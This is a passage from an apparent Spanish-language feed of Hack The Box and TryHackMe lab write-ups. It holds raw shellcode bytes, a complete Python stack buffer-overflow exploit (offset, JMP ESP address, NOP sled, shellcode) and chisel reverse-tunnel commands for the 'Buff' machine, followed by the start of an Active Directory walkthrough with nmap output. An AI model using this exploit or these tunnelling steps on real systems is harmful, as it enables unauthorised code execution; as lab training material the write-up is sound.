&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;51&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;9a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;9d&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4a&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bf&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;49&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ae&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;94&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;9e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ee&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;75&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4f&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;92&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ea&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b3&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ef&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;56&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;51&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;94&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ef&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ac&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5e&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;47&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fe&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fe&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f6&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ac&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;pre&gt;&lt;code class=&quot;language-python3&quot;&gt;#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time

from pwn import *
from struct import pack


def def_handler(sig,frame):
        print(&quot;\n[*] Saliendo .. .&quot;)
        sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
remoteAddress = &quot;127.0.0.1&quot;

def executeExploit():

        shellcode = ( b&quot;\xdb\xc0\xb8\xd2\x0e\x7f\x2f\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1&quot;
                b&quot;\x52\x31\x42\x17\x83\xc2\x04\x03\x90\x1d\x9d\xda\xe8\xca\xe3&quot;
                b&quot;\x25\x10\x0b\x84\xac\xf5\x3a\x84\xcb\x7e\x6c\x34\x9f\xd2\x81&quot;
                b&quot;\xbf\xcd\xc6\x12\xcd\xd9\xe9\x93\x78\x3c\xc4\x24\xd0\x7c\x47&quot;
                b&quot;\xa7\x2b\x51\xa7\x96\xe3\xa4\xa6\xdf\x1e\x44\xfa\x88\x55\xfb&quot;
                b&quot;\xea\xbd\x20\xc0\x81\x8e\xa5\x40\x76\x46\xc7\x61\x29\xdc\x9e&quot;
                b&quot;\xa1\xc8\x31\xab\xeb\xd2\x56\x96\xa2\x69\xac\x6c\x35\xbb\xfc&quot;
                b&quot;\x8d\x9a\x82\x30\x7c\xe2\xc3\xf7\x9f\x91\x3d\x04\x1d\xa2\xfa&quot;
                b&quot;\x76\xf9\x27\x18\xd0\x8a\x90\xc4\xe0\x5f\x46\x8f\xef\x14\x0c&quot;
                b&quot;\xd7\xf3\xab\xc1\x6c\x0f\x27\xe4\xa2\x99\x73\xc3\x66\xc1\x20&quot;
                b&quot;\x6a\x3f\xaf\x87\x93\x5f\x10\x77\x36\x14\xbd\x6c\x4b\x77\xaa&quot;
                b&quot;\x41\x66\x87\x2a\xce\xf1\xf4\x18\x51\xaa\x92\x10\x1a\x74\x65&quot;
                b&quot;\x56\x31\xc0\xf9\xa9\xba\x31\xd0\x6d\xee\x61\x4a\x47\x8f\xe9&quot;
                b&quot;\x8a\x68\x5a\xbd\xda\xc6\x35\x7e\x8a\xa6\xe5\x16\xc0\x28\xd9&quot;
                b&quot;\x07\xeb\xe2\x72\xad\x16\x65\x77\x38\x08\x70\xef\x3e\x28\x7b&quot;
                b&quot;\x54\xb7\xce\x11\xba\x9e\x59\x8e\x23\xbb\x11\x2f\xab\x11\x5c&quot;
                b&quot;\x6f\x27\x96\xa1\x3e\xc0\xd3\xb1\xd7\x20\xae\xeb\x7e\x3e\x04&quot;
                b&quot;\x83\x1d\xad\xc3\x53\x6b\xce\x5b\x04\x3c\x20\x92\xc0\xd0\x1b&quot;
                b&quot;\x0c\xf6\x28\xfd\x77\xb2\xf6\x3e\x79\x3b\x7a\x7a\x5d\x2b\x42&quot;
                b&quot;\x83\xd9\x1f\x1a\xd2\xb7\xc9\xdc\x8c\x79\xa3\xb6\x63\xd0\x23&quot;
                b&quot;\x4e\x48\xe3\x35\x4f\x85\x95\xd9\xfe\x70\xe0\xe6\xcf\x14\xe4&quot;
                b&quot;\x9f\x2d\x85\x0b\x4a\xf6\xa5\xe9\x5e\x03\x4e\xb4\x0b\xae\x13&quot;
                b&quot;\x47\xe6\xed\x2d\xc4\x02\x8e\xc9\xd4\x67\x8b\x96\x52\x94\xe1&quot;
                b&quot;\x87\x36\x9a\x56\xa7\x12&quot;)

        offset = 1052
        antes_eip = b&quot;A&quot;*offset
        EIP = pack(&quot;&amp;lt;I&quot;, 0x68a98a7b) #JMP ESP
        nops = b&quot;\x90&quot;*16 # b&quot;\x83\xec\x10&quot;

        payload = antes_eip + EIP + nops + shellcode

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remoteAddress, 8888))
        s.send(payload)

if __name__ == &apos;__main__&apos;:

        executeExploit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez vemos que nos funciona el exploit en nuestra maquina local procedemos a cambiar la ip y el shellcode. 
Y lo ejecutamos en la maquina victima&lt;/p&gt;

&lt;p&gt;./chisel client 10.10.16.5:1233 R:8888:127.0.0.1:8888 conectamos&lt;/p&gt;

&lt;p&gt;./chisel server –reverse –port 1233 recibimos&lt;/p&gt;

&lt;p&gt;Ejecutamos el exploit&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# python3 exploit.py&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;roo.txt
78f9007b26a3846afxxxxxxxxxxxxxxxx&lt;/p&gt;</content><author><name>Pirrandi</name></author><category term="HTB," /><category term="Bypass," /><category term="BruteForce," /><category term="Web" /><category term="Hacking," /><category term="Maquinas" /><category term="Retiradas," /><category term="Writeup" /><summary type="html">BUFF ~ Hack The Box</summary></entry><entry><title type="html">Maquina Retirada Search de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2022/06/05/Attacktive-THM-AD.html" rel="alternate" type="text/html" title="Maquina Retirada Search de Hack The Box (Necesario VIP)" /><published>2022-06-05T00:00:00-03:00</published><updated>2022-06-05T00:00:00-03:00</updated><id>http://localhost:4000/2022/06/05/Attacktive-THM-AD</id><content type="html" xml:base="http://localhost:4000/2022/06/05/Attacktive-THM-AD.html">&lt;h1 id=&quot;attacktive--try-hack-me&quot;&gt;Attacktive ~ Try Hack Me&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.165.157       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Segundo escaneo para ver los Servicios&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-14 11:39:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-06-14T11:40:15+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2022-06-13T11:34:00
|_Not valid after:  2022-12-13T11:34:00
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-06-14T11:40:05+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
